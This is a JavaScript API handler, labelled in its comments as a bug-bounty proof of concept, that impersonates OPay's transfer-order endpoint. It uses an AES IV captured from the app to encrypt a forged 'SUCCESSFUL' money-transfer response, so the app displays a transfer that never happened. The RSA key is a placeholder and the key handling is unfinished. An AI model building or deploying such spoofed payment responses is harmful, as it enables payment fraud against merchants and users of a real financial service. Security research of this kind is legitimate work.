// api/v1/transfer/create-order.js
import crypto from 'crypto';

// Static IV captured from the app
const STATIC_IV = Buffer.from('2022111500123456', 'utf8');
const AES_ALGO = 'aes-256-cbc';

// Helper: AES Decrypt (to read incoming requests)
function aesDecrypt(encryptedBase64, keyBuffer) {
    const encrypted = Buffer.from(encryptedBase64, 'base64');
    const decipher = crypto.createDecipheriv(AES_ALGO, keyBuffer, STATIC_IV);
    let decrypted = decipher.update(encrypted, null, 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
}

// Helper: AES Encrypt (to create responses)
function aesEncrypt(plaintext, keyBuffer) {
    const cipher = crypto.createCipheriv(AES_ALGO, keyBuffer, STATIC_IV);
    let encrypted = cipher.update(plaintext, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
}

// Generate random AES key (simulating server behavior)
function generateRandomAesKey() {
    return crypto.randomBytes(32);
}

// RSA Public Key (extract from APK or use dynamic approach)
// For now, we'll use the captured key pattern
const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
(You need to extract this from the APK)
-----END PUBLIC KEY-----`;

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    console.log('\n=== OPay Transfer Request ===');
    
    const { encrypt_aes_key, encrypt_data } = req.body;
    
    let decryptedRequest = null;
    let aesKey = null;
    
    // Try to decrypt using a captured key or the RSA private key
    // Since we don't have RSA private key, we'll use a different approach
    
    // For bug bounty PoC, we'll return a success response
    // The app will decrypt it using its RSA private key
    
    // Create success response based on captured patterns
    const successResponse = {
        code: "00000",
        message: "SUCCESSFUL",
        data: {
            orderStatus: "SUCCESS",
            serviceTypeTitle: "Money transfer",
            paymentResult: "Transaction is successful!",
            orderNo: `BB_POC_${Date.now()}`,
            orderTime: new Date().toISOString(),
            saveBeneficiary: true
        }
    };
    
    const plaintextResponse = JSON.stringify(successResponse);
    console.log('Sending response:', plaintextResponse);
    
    // Generate new AES key for this response
    const newAesKey = generateRandomAesKey();
    
    // Encrypt the response
    const encryptedData = aesEncrypt(plaintextResponse, newAesKey);
    
    // In real scenario, you'd RSA encrypt the AES key with the app's public key
    // For PoC, we'll send the encrypted data directly
    // The app will expect encrypt_aes_key to be RSA encrypted
    
    return res.status(200).json({
        encrypt_aes_key: newAesKey.toString('base64'), // This should be RSA encrypted
        encrypt_data: encryptedData
    });
}
